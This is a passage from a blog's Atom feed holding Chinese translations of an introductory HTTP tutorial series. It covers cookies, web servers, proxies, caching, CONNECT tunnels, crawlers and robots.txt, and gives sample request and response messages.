Customer=&quot;WILE_E_COYOTE&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;</span><br></pre></td></tr></table></figure><p> 服务器向用户代理(浏览器)发送Set-Cookie2响应首部字段, 指示用户代理在cookie中写入用户相关信息。</p></li><li><p>用户代理 -&gt; 服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /acme/pickitem HTTP/1.1</span><br><span class="line">Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;</span><br><span class="line">[form data]</span><br></pre></td></tr></table></figure><p> 用户将选择的物品添加到购物车中。</p></li><li><p>服务器 -&gt; 用户代理</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie2: Part_Number=&quot;Rocket_Launcher_0001&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;</span><br></pre></td></tr></table></figure><p> 购物车中添加了所选出物品。</p></li><li><p>用户代理 -&gt; 服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /acme/shipping HTTP/1.1</span><br><span class="line">Cookie: $Version=&quot;1&quot;; Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;; </span><br><span class="line">        Part_Number=&quot;Rocket_Launcher_0001&quot;;</span><br><span class="line">[form data]</span><br></pre></td></tr></table></figure><p> 用户选择送货方式。</p></li><li><p>服务器 -&gt; 用户代理</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie2: Shipping=&quot;FedEx&quot;; Version=&quot;1&quot;; Path=&quot;/acme&quot;</span><br></pre></td></tr></table></figure><p> 产生新的Coookie中映射出送货方式。</p></li><li><p>用户代理 -&gt; 服务器</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /acme/process HTTP/1.1</span><br><span class="line">Cookie: $Version=&quot;1&quot;;</span><br><span class="line">Customer=&quot;WILE_E_COYOTE&quot;; $Path=&quot;/acme&quot;;</span><br><span class="line">Part_Number=&quot;Rocket_Launcher_0001&quot;; $Path=&quot;/acme&quot;;</span><br><span class="line">Shipping=&quot;FedEx&quot;; $Path=&quot;/acme&quot;</span><br><span class="line">[form data]</span><br></pre></td></tr></table></figure></li></ol><p>这就是完整的流程。</p><p>有一点我必须要提醒你, Cookie并不是完美的。除开安全考虑, 还有一个问题, Cookie的使用会与REST架构风格发生冲突。</p><p><em>注:发生冲突的原因可见文末的附加内容。若对<a href="https://www.infoq.com/articles/rest-anti-patterns" target="_blank" rel="noopener">英文版的完整解释</a>有兴趣的话, 可以点击打开。</em></p><p>你可以在<a href="https://www.ietf.org/rfc/rfc2965.txt" target="_blank" rel="noopener">RFC 2965</a>了解更多关于cookie的信息。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文为HTTP系列的一部份。</p><p>由本文, 你已经了解到了内容个性化的优缺点, 也知道了服务器标识客户端的多种方法。接下来, 在HTTP系列的第四部分中, 我们将会探讨到最重要的一类客户端标识: 认证(authentication)。</p><p>如果你发现本文讲述的某些概念不是很清楚, 你可以参考[HTTP系列][]]的<a href="https://se8s0n.github.io/2018/06/19/HTTP%E7%B3%BB%E5%88%97(%E4%B8%80)/" target="_blank" rel="noopener">第一部分</a>和<a href="https://se8s0n.github.io/2018/08/18/HTTP%E7%B3%BB%E5%88%97(%E4%BA%8C)/" target="_blank" rel="noopener">第二部分</a>。</p><h2 id="附加内容"><a href="#附加内容" class="headerlink" title="附加内容"></a>附加内容</h2><ol><li><p>漫画内容翻译<br> A：让我们开始会议吧, 但是你要知道, 我会(在会议过程中)记录下你所有的欺凌行为。<br> B :emmmm, 我根本不是一个欺凌者, 但是你现在的确认偏误搞得像我在欺凌你一样, 这让我很难受。<br> A:可以请你重复一下你暗示我我是个妄想的女巫之后的内容吗？</p></li><li><p>Cookie与REST架构产生冲突的原因</p><blockquote><p>One of the key ideas of REST is statelessness – not in the sense that a server can not store any data: it’s fine if there is resource state, or client state.</p></blockquote></li></ol><p>REST的主要思想是无状态, 无状态并不意味着服务器不能存储任何数据, 而是它<strong>只能用来存储资源状态、客户端状态</strong>。</p><blockquote><p>The most typical use of cookies is to store a key that links to some server-side data structure that is kept in memory. This means that the cookie, which the browser passes along with each request, is used to establish conversational, or session, state.</p></blockquote><p>通常, <strong>cookie都被用来存储一个由服务器端发来的值</strong>(即存储了服务器端的内容), 该值最后存储于用户硬盘中。这就意味着, 浏览器随每个请求一起发送的cookie, 都是用于设定通信的状态或传送会话的状态。</p><blockquote><p>If a cookie is used to store some information, such as an authentication token, that the server can validate without reliance on session state, cookies are perfectly RESTful </p></blockquote><p>假如cookie中存储了认证信息(例如会话令牌, 即session token), 那么服务器不用验证会话状态就可直接登陆(账户), 此时使用cookie就会完全符合REST原则——此时, cookie存储的session是客户端的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;到现在, 你已经了解HTTP的基本概念及其体系结构, 那么, 就可以让进入下一个重要的部分——客户端标识。&lt;/p&gt;
&lt;p&gt;你知道为什么客户端识别那么重要吗? 你知道Web服务器是怎样识别你所用的客户端的吗?你知道怎样使用和存储这些身份信息吗?看完这篇文章, 你的这些问题都能
      
    
    </summary>
    
    
      <category term="HTTP" scheme="http://Se8S0n.github.io.git/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP系列(二):HTTP的结构体系</title>
    <link href="http://Se8S0n.github.io.git/2018/08/18/HTTP%E7%B3%BB%E5%88%97(%E4%BA%8C)/"/>
    <id>http://Se8S0n.github.io.git/2018/08/18/HTTP系列(二)/</id>
    <published>2018-08-18T18:09:21.000Z</published>
    <updated>2021-08-05T06:51:27.283Z</updated>
    
    <content type="html"><![CDATA[<p>在本系列的<a href="https://se8s0n.github.io/2018/06/19/HTTP%E7%B3%BB%E5%88%97(%E4%B8%80)/" target="_blank" rel="noopener">第一篇文章</a>中, 我们探讨了HTTP的基本概念。有了(前面的)基础, 我们就可以开始HTTP结构体系的学习。 HTTP协议不仅仅只是用来发送和接收数据的。</p><p>实际上, HTTP协议本身是不能作为应用程序协议工作的, 但是因为它的基础结构是由硬件和软件组成, 软硬件协同工作提供了不同的服务, 这才能在万维网上实现有效的通信。</p><p>本文是HTTP系列文章的第二部分。</p><p>文章概要:</p><ul><li><a href>Web服务器(Web Severs)</a></li><li><a href>代理服务器(Proxy Severs)</a></li><li><a href>缓存(Caching)</a></li><li><a href>网关(Gateways), 隧道(Tunnels), 中继代理(Relays)</a></li><li><a href>网络爬虫(Web Crawlers)</a></li></ul><p>这些都是我们网络生活中不可分割的一部分, 接下来, 你可以(通过本文)全面地了解它们的用途及其工作形式。接下来学习的内容可以帮你把第一篇文章中的(知识)点串起来, 这样, 你就可以熟悉HTTP通信过程。</p><p>那么, 让我们现在就开始学习吧！</p><h2 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h2><p>正如第一篇文章所提到的, Web服务器的主要功能是存储资源并在接收请求后(按照请求)处理资源。通过Web客户端(又称为Web浏览器)用户可访问Web服务器, 并返回获取请求的资源或更改(资源的)现有的状态。访问Web服务器的操作, 通过网络爬虫, 也可以实现自动化, 相关内容我们会在文章后面进行深入的了解。<br><img src="https://code-maze.com/wp-content/uploads/2017/06/servers.jpg" alt><br>你所知道的最流行的服务器, 不外乎是Apache的HTTP 服务器、Nginx、<br>IIS、Glassfish…</p><p>Web服务器可分为(使用)单种简单易用的软件或(使用)多种复杂的软件的服务器。 现代的Web服务器能够执行许多不同的任务, 其基本功能为:</p><ul><li><strong>建立连接</strong> —— 接受或关闭客户端连接</li><li><strong>接收请求</strong> —— 读取HTTP请求报文</li><li><strong>处理请求</strong> —— 解析请求报文并执行(相应请求)</li><li><strong>访问资源</strong> —— 访问请求报文中(请求的)资源</li><li><strong>构造响应</strong> —— 创建HTTP响应报文</li><li><strong>发送响应</strong> —— 向客户端返回响应报文</li><li><strong>事务日志</strong> —— 在日志文件中记录已完成的事务</li></ul><p>我将Web服务器基本(工作)流程分为不同的阶段, 所列出的阶段是Web服务器(工作)流程的一个极其简化的版本。</p><h3 id="阶段-1：建立连接"><a href="#阶段-1：建立连接" class="headerlink" title="阶段 1：建立连接"></a>阶段 1：建立连接</h3><p>当Web客户端要访问Web服务器时, 客户端必须要重新打开一个TCP连接。与此同时, Web服务器在另一边向客户端确认IP地址。然后, 由服务器决定是否与该客户端建立TCP连接。</p><p>如果服务器接受连接, 它会将客户端的IP地址添加到现有连接的列表中, 并监视该连接上的数据。</p><p>如果客户端未被授权或是黑名单中的(视为恶意的), 服务器可以关闭TCP连接。</p><p>服务器还可以使用”反向 DNS(Domain Name System, 域名服务器)”来识别客户端的主机名。客户端的主机名有利于事务日志的记录, 但主机名的查找需要时间, 所以会造成记录事务的速度减慢。</p><h3 id="阶段-2：接收-处理请求"><a href="#阶段-2：接收-处理请求" class="headerlink" title="阶段 2：接收/处理请求"></a>阶段 2：接收/处理请求</h3><p>分析接收的请求时, Web服务器会分析报文的请求行、首部字段和主体(如果有提供的话) 中的信息。需要注意的一点是, TCP连接可以随时暂停, 因此在这种情况下, 服务器必须将(已传送)数据临时存储起来, 直到服务器接收到剩余(未传输的)数据。</p><p>高端的Web服务器能够同时建立大量连接——包括同时与同一客户端有多个连接。因此, 典型Web页面可以向高端服务器请求大量不同的资源。</p><h3 id="阶段-3：访问资源"><a href="#阶段-3：访问资源" class="headerlink" title="阶段 3：访问资源"></a>阶段 3：访问资源</h3><p>Web 服务器通过多种方法映射和操作资源, (为Web客户端)提供资源。</p><p>映射资源最简单的方法, 就是根据请求(报文)中的URI在Web服务器的文件系统中查找所需的文件。通常, 资源都存放在服务器上一个被称为文件根目录(docroot)的特殊文件夹中。例如, Windows 服务器上的文件根目录就位于“F:\WebResources \”。假设有一个GET请求想要访问”/image/codemazeblog”上的文件, 服务器会将其转换为”F:\WebResources\images\codemazeblog.txt”, 并在响应报文中返回该文件。当一个Web 服务器承载多个网站时, 每个站点都会有其独立的的文件根目录。</p><p>如果 Web 服务器接收到的是对(文件)路径的请求, 而不是对文件的请求, 服务器可以用以下几种方式处理请求:返回错误消息; 替代返回路径或遍历路径, 返回默认索引文件;返回带有(所请求)内容的HTML文件。</p><p>服务器还可以将请求(报文)中的URI映射到动态资源上, 这些动态资源是由应用程序生成的。有一类服务器叫做应用程序服务器, 其功能就是管理动态资源, 它还能给Web服务器提供复杂的软件解决方案。</p><h3 id="阶段-4：生成及发送响应"><a href="#阶段-4：生成及发送响应" class="headerlink" title="阶段 4：生成及发送响应"></a>阶段 4：生成及发送响应</h3><p>一旦服务器确定了需要所请求的资源, 它就会生成响应报文, 报文中包含状态码、响应首部字段, 若请求(报文)中需要的话还应有响应主体。</p><p>如果存在响应主体, 那么该响应报文通常包含Content-Length和Content-Type两个首部字段——Content-Length描述主体大小, Content-Type描述返回资源的MIME类型。</p><p>生成响应(报文)后, 服务器选择需要发送响应的客户端。对于非持久性(长期)连接, 服务器需要在发送整个响应消息后关闭连接。</p><h3 id="阶段-5-记录事务"><a href="#阶段-5-记录事务" class="headerlink" title="阶段 5:记录事务"></a>阶段 5:记录事务</h3><p>服务器在事务完成后将记录文件中的所有事务信息, 大部分的服务器都采用自定义的方式记录日志。</p><h2 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h2><p>代理服务器 (代理) 是的中间服务器, 通常位于Web服务器和Web客户端之间, 因其性质, 代理服务器需要兼并Web客户端和Web服务器的功能。</p><p>不过, 为什么要用代理服务器呢？为什么不直接用Web客户端和Web服务器进行通信？这难道不是更加简单快速吗？</p><p>当然, (直接利用Web客户端和Web服务器)操作起来是很简单, 不过说到速度快, 那就未必了。接下来, 我们会了解原因的。</p><p>在解释什么是代理服务器之前, 我们先要搬开一块大石头, 那就是<strong>反向代理服务器(reverse proxy)</strong>的概念。 换句话来说就是知道 <strong>正向代理(forward proxy)</strong>和<strong>反向代理( reverse proxy)</strong>有什么区别。</p><p>正向代理负责向Web服务器请求资源, 并将资源返回到客户端。除此之外, 正向代理还能通过防火墙过滤请求或隐藏客户端信息来维护客户端的安全。而反向代理的工作方式(与正向代理)完全相反, 它通常位于防火墙之后来保护 Web 服务器。所有客户端已知其通信对象是实际的Web服务器, 但却了解反向代理背后的(Web服务器所处的)网络。</p><h3 id="代理服务器-1"><a href="#代理服务器-1" class="headerlink" title="代理服务器"></a>代理服务器</h3><p><img src="https://code-maze.com/wp-content/uploads/2017/06/proxy-server.png" alt></p><h3 id="反向代理服务器"><a href="#反向代理服务器" class="headerlink" title="反向代理服务器"></a>反向代理服务器</h3><p><img src="https://code-maze.com/wp-content/uploads/2017/06/proxy-server-1.png" alt><br>代理(服务器)非常有用并且应用十分广泛。接下来, 让我们来了解一下代理服务器的功能。</p><ul><li><strong>压缩(Compression)</strong> —— 就是简单地利用压缩内容的方式加快通信速度。</li><li><strong>监控(Monitoring)和过滤(filtering)</strong> —— 用代理服务器(进行监控和过滤)不失为一个阻止小学生访问成人网站好方法。🙂</li><li><strong>安全(Security)</strong> —— 代理(服务器)可以作为整个网络的一个独立的入口点, 它们能够检测恶意软件和对应用层协议设限。</li><li><strong>匿名性(Anonymity)</strong> —— 代理可以修改请求(报文)以提高匿名性, 它可以从请求中剥离敏感信息, 只留下重要的东西。尽管向服务器发送较少的信息会降低用户体验,<br>但是有时侯, 匿名性(比用户体验)更重要。</li><li><strong>访问控制(Access control)</strong> —— 若要实现对多个服务器的访问控制, 集中管理单个代理服务器即可。</li><li><strong>缓存(Caching)</strong> —— 使用代理服务器缓存常用的内容, 会大大降低加载速度。<em>注:这里的加载速度按照我自己的理解, 应该是如果存在缓存的话,<br>服务器需要先去加载缓存中的内容, 这会降低加载的速度</em></li><li><strong>负载均衡(Load balancing)</strong> —— 如果服务达到性能的临界点, 你可以使用<a href="https://zhuanlan.zhihu.com/p/32854860" target="_blank" rel="noopener">负载均衡器</a>——负载均衡器是一种可均衡分配路由通信量的代理, 可避免在服务性能达到临界点时导致单个服务器超负荷——分配在资源或Web服务器中的负载。</li><li><strong>转码(Transcoding)</strong> —— 代理服务器有修改报文主体的功能。</li></ul><p>综上所述, 代理(服务器)有功能多样且可灵活使用的特点。</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>Web 缓存(系统)是一种可以自动复制请求报文数据并将其保存到本地存储中的设备。</p><p>Web缓存的优点:</p><ul><li><strong>减少通信量</strong></li><li><strong>消除网络瓶颈</strong></li><li><strong>防止服务器草符合</strong></li><li><strong>降低</strong>长距离造成的<strong>响应延迟</strong></li></ul><p>因此, 可以直白地说, Web缓存改善了用户体验和服务器性能。当然, 还有可能省了很多钱。</p><p>命中率的范围由0至1, 其中0表示缓冲提供所请求的0%资源 ,而1表示缓冲提供所请求的100%资源。命中率最理想的状态当然是达到100%, 但是, 实际命中率通常只能接近40%。</p><p>下面是基本的Web缓存的工作流程:<br><img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1534998705/HTTP/CacheFlow.png" alt></p><h2 id="网关、隧道、中继代理"><a href="#网关、隧道、中继代理" class="headerlink" title="网关、隧道、中继代理"></a>网关、隧道、中继代理</h2><p>随着HTTP(越来越)成熟, 不同的HTTP协议使用方法不断涌现出来。这就促使, HTTP——连接不同应用程序和协议的框架——变得非常有用。</p><p>接下来, 就让我们来看看HTTP是怎么做到如此有用的。</p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h3><p>网关是一种(网络)硬件，它能够通过抽象方法使 HTTP协议与不同协议和不同应用程序进行通信, 从而获得资源。网关也被称为协议转换器, 由于(具有)多个协议的应用, 所以它比路由器或交换机复杂得多。</p><p>下面是网关利用转换协议工作的实例:使用网关发送HTTP请求可以接收到FTP(File Transfer Protocol, 文件传输协议)文件; 使用客户端加速安全网关可以接收到SSL(Secure Sockets Layer, 安全套接层)加密后转换成HTTP协议的报文; 使用服务器端安全网关可以将HTTP报文转换成更安全的HTTPs报文(Hypertext Transfer Protocol Secure, 超文本传输安全协议);</p><h3 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h3><p>隧道(协议)是利用CONNECT请求方法实现的, 该协议能够通过HTTP协议发送非HTTP的数据。CONNECT是一个(客户端)要求代理连接目标服务器的请求方法, 并且在客户端和服务器之间中转数据。</p><p><em>注：上面这句话简单理解就是, 隧道协议不用HTTP解析数据, 对数据不做任何处理, 只将数据直接中转给目标服务器。</em></p><p>CONNECT请求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONNECT api.github.com:443 HTTP/1.0</span><br><span class="line">User-Agent: Chrome/58.0.3029.110</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml</span><br></pre></td></tr></table></figure></p><p>CONNECT响应:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 Connection Established</span><br><span class="line">Proxy-agent: Netscape-Proxy/1.1</span><br></pre></td></tr></table></figure></p><p>与常规的HTTP响应(报文)不同, CONNECT响应不需要特别说明Content-Type字段。</p><p>一旦(隧道)建立了连接,客户端和服务器就可以直接进行通信。</p><h3 id="中继代理"><a href="#中继代理" class="headerlink" title="中继代理"></a>中继代理</h3><p>中继(服务器)在HTTP世界中充当着坏人的角色, 他们不受HTTP的律法束缚。实际上, 中继(服务器)是代理的简化版本, 只要它们能够建立连接——仅需请求报文中极少信息量——那么就可以中转所有接收到的信息。</p><p>中继存在的唯一的理由就是, (在某些情况下)需要一个尽可能少惹麻烦的代理。不过, 使用中继也可能带来麻烦。因此中继是应用在特定场景下, 所以在添加中继(服务器)之前, 一定要先考虑添加之后的损益比。</p><h2 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h2><p><img src="https://code-maze.com/wp-content/uploads/2017/06/Web-crawler.png" alt><br>当然, 通常都称呼它为网络蜘蛛(spiders), 它是一种网络机器人, 用于自动浏览万维网和编纂网络索引。因此,对于搜索引擎和大部分来说, 网络爬虫是必不可少的工具。</p><p>网络爬虫是一个全自动化的软件, 不需要人机交互。网络爬虫的复杂度差异会很大, 一些网络爬虫就非常复杂(比如搜索引擎用的爬虫)。</p><p>网络爬虫会消耗所访问的网站的资源。因此, 公开的网站有一个机制去告知爬虫：网站哪些内容可被抓取, 或禁止爬虫抓取任何数据。你可以通过<strong>robots.txt</strong>Robots Exclusion Protocol, 漫游器排除协议)去实现这个机制。</p><p>毫无疑问, robots.txt不能阻止那些不请自来的网络爬虫抓取网站, 因为它只是一个标准。也就是说, robots.txt只能防君子不能防小人。</p><p>下面是robots.txt书写方式的举例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure></p><p>含义:禁止所有爬虫访问网站的任何部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /somefolder/</span><br><span class="line">Disallow: /notinterestingstuff/</span><br><span class="line">Disallow: /directory/file.html</span><br></pre></td></tr></table></figure></p><p>含义:仅禁止访问两个特定的目录和文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Googlebot</span><br><span class="line">Disallow: /private/</span><br></pre></td></tr></table></figure></p><p>含义:在特定情况下, 禁止指定的爬虫访问。</p><p>不过, 鉴于万维网的庞大, 即使是有史以来最强大的爬虫, 也无法抓取整个网络的资源并编纂整个网络的索引。这就是爬虫使用<strong>选择策略(selection policy)</strong>抓取关联性最大的部分的原因。此外, 万维网经常发生动态变化, 因此爬虫必须用<strong>重新访问策略(freshness policy )</strong>去计算它们是否能再次访问网站。并且, 爬虫轻松覆盖整个服务器的资源时, 会采取发送过于快速和繁多的请求的举措, 因此爬虫会采取<strong>平衡礼貌策略(politeness policy)</strong>避免造成服务器不能正常使用。已知的大部分爬虫, 以低至20秒高至3-4分钟的时间间隔对服务器进行轮询, 避免使服务器上超载。</p><p><em>注:重新访问策略其实就是为了避免资源过期, 爬虫进行确认的一个机制。</em></p><p>你可能听说过神秘又邪恶的深网或暗网。但是, 深网(暗网)只是网络的一部分, 搜索引擎为了将(其中的)信息藏起来故意不把它们编入索引。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个链接是<a href>HTTP系列</a>的目录及简介。相信你现在脑海中对HTTP工作流程已经有了更加清晰的概念, 学到了比(原本的)请求、响应、状态码更多的知识正是不同的软硬件结合的整体架构, 才让作为应用层协议的HTTP能够发挥出它的潜能。</p><p>我在这篇文章谈到的每个概念都很庞大, 大到足以用一篇文章甚至一本书来细细讲述。不过, 我只是想大概介绍一下概念, 这样你们就知道这些概念是如何搭配使用的, 方便你们之后查找相关内容。</p><p>如果在阅读的过程中, 你发现有些内容解释得过于简短和不清晰并且没有看过我之前的文章, 你可以阅读这篇文章的<a href>第一部分</a>和<a href>HTTP指南</a>, 在这两篇文章中都有关于HTTP基本概念的概述。</p><p>感谢你阅读本文, 敬请关注HTTP系列的<a href>第三部分</a>, 我在这篇文章中讲述了服务器是如何识别客户端的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在本系列的&lt;a href=&quot;https://se8s0n.github.io/2018/06/19/HTTP%E7%B3%BB%E5%88%97(%E4%B8%80)/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;第一篇文章&lt;/a&gt;中, 我们探讨了HTT
      
    
    </summary>
    
    
      <category term="HTTP" scheme="http://Se8S0n.github.io.git/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP系列(一)：HTTP的基础概念概述</title>
    <link href="http://Se8S0n.github.io.git/2018/06/19/HTTP%E7%B3%BB%E5%88%97(%E4%B8%80)/"/>
    <id>http://Se8S0n.github.io.git/2018/06/19/HTTP系列(一)/</id>
    <published>2018-06-19T19:15:45.000Z</published>
    <updated>2021-08-05T06:51:27.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在网上看到这篇很棒的文章, 所以接下来, 我会边学习边翻译<a href="https://code-maze.com/http-series/" target="_blank" rel="noopener">HTTP系列</a>这篇文章。<br>如果想阅读原文, 你可以访问这个网站: <a href="https://code-maze.com/" target="_blank" rel="noopener">https://code-maze.com/</a></p><p>原作者是一个很nice的人, 也花了挺多时间写这篇文章还有维护这个网站的, 相信大家能在网站里找到更多自己想要的东西。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>本文会对HTTP的基础概念进行介绍。</p><h2 id="为什么要学HTTP"><a href="#为什么要学HTTP" class="headerlink" title="为什么要学HTTP?"></a>为什么要学HTTP?</h2><p>你可能会问：为什么要了解HTTP协议? </p><p>如果你是软件开发人员, 学习HTTP协议通信过程, 能让你知道怎么样才能写出更好的应用程序。<br>如果你是系统架构师或者是网络管理员, 学习HTTP通信过程, 能让你进一步学习如何设计复杂的网络体系结构。</p><p><a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="noopener">表现层状态转换</a>(REST, Representational State Transfer)是现在一种很重要的架构风格, 使用这个架构时我们需要先了解HTTP协议的特性, 因此, 学习HTTP协议就变得尤为重要了。如果你想做好RESTful架构的产品, 你就必须先学习HTTP协议。</p><p>我必须提醒你, REST架构并不是只能使用HTTP协议的, 它也能用其他的协议来实现。但是, 由于HTTP应用的广泛性, 它在那场战役(选择实现REST架构的协议的那场战争)中获得了胜利, 因此给予找不到用其他协议来实现的REST架构。</p><p>难道, 你想错过这个了解、学习万维网和网络通信的基本概念的机会吗？</p><p>我觉得你不会想错过的🙂</p><p>本文会尽可能简单地介绍HTTP重要的部分。这篇文章整合了HTTP中有用的信息, 省去你们花费在书籍和RFC文档上寻找需要信息的时间。</p><p>本文是HTTP系列的第一篇文章, 它简要地介绍HTTP的基础概念。</p><p>文章概要：</p><ul><li>HTTP的定义</li><li>资源</li><li>如何在WEB客户端和服务器之间交换信息?</li><li>报文实例</li><li>MIME类型</li><li>请求方法</li><li>报文首部</li><li>状态码</li></ul><p>闲话少说, 直接进入下面的学习吧！</p><h2 id="HTTP的定义"><a href="#HTTP的定义" class="headerlink" title="HTTP的定义"></a>HTTP的定义</h2><p>纵观HTTP的发展史,有两个重要人物，一个是发明万维网和HTTP协议的Tim Berners-Lee, 另一个是REST架构风格的发明者Roy Fielding。</p><p><strong>超文本传输协议(The Hypertext Transerfer Protocol)</strong>是应用程序之间的通信协议。本质上, HTTP协议是负责委派互联网中客户端和服务器端之间的媒体文件(包括HTML、图片、文本文件、电影等客户端和服务器端之间传输的所有文件), 通过HTTP协议媒体文件能够快速、可靠地传输。HTTP被用于应用层通信, 因此HTTP协议是应用层协议而不是传输层协议。为了让你们记起相关知识, 我在下面放出了网络栈的构成图。<br><img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1532267037/Network-stack_rf2on4.png" alt><br>在上图中, 你可以清晰地看到, HTTP是应用层协议, 而TCP才是传输层协议。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><img src="https://code-maze.com/wp-content/uploads/2017/06/resource-1024x475.jpg" alt><br>因特网上所有的内容都是资源(Resource), HTTP正是处理这些资源的协议——包括文件、(数据)流、 服务和其他所有的东西。HTML页面、youtube上的视频、WEB应用程序上日常任务电子表格…这些都是资源。(相信通过上面的举例)你已经知道了什么是资源了。</p><p>接下来就要思考另一个问题了, 如何区分不同的资源?</p><p>通过给资源标识URLs(Uniform resource locators, 统一资源定位符)——这里URL和URI(统一资源标识符)在大部分时候都可以混用。</p><p>URL指向唯一的(资源存放)位置。</p><h2 id="如何在Web客户端和服务器端之间交换信息"><a href="#如何在Web客户端和服务器端之间交换信息" class="headerlink" title="如何在Web客户端和服务器端之间交换信息?"></a>如何在Web客户端和服务器端之间交换信息?</h2><p>所有的内容、资源都是存放在一些WEB服务器(HTTP服务器)上的。想要获取资源, 那么需要你发送HTTP请求给这些(HTTP)服务器。</p><p>但是, 怎么样才能从WEB服务器请求(得到)资源?</p><p>当然, 你必须先有一个支持HTTP协议的客户端🙂。</p><p>你现在阅读文章时所使用的Web浏览器, 就是HTTP客户端。</p><p>Web浏览器与HTTP服务器进行通信,之后, 将从服务器上获取的资源传送到你的电脑中。</p><p>(市面上)最流行的客户端有:Google的Chrome浏览器、Mozilla的火狐浏览器、Apple的Safari浏览器、(居然还有)臭名昭著的Internet Explorer浏览器。<br><em>注：作者原本写的是unfortunately,我感觉这种“哀其不幸, 怒其不争”的语气去吐槽还有人用着Internet Explorer这件事, 用“居然”会稍微合适一点</em></p><h2 id="报文实例"><a href="#报文实例" class="headerlink" title="报文实例"></a>报文实例</h2><p>那, HTTP报文到底长什么样?</p><p>多说无益, 下面列出HTTP报文的示例:</p><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /repos/CodeMazeBlog/ConsumeRestfulApisExamples HTTP/1.1</span><br><span class="line">Host: api.github.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Basic dGhhbmtzIEhhcmFsZCBSb21iYXV0LCBtdWNoIGFwcHJlY2lhdGVk</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /repos/CodeMazeBlog/ConsumeRestfulApisExamples/hooks?access_token=5643f4128a9cf974517346b2158d04c8aa7ad45f HTTP/1.1</span><br><span class="line">Host: api.github.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  &quot;url&quot;: &quot;http://www.example.com/example&quot;,</span><br><span class="line">  &quot;events&quot;: [</span><br><span class="line">    &quot;push&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;name&quot;: &quot;web&quot;,</span><br><span class="line">  &quot;active&quot;: true,</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;url&quot;: 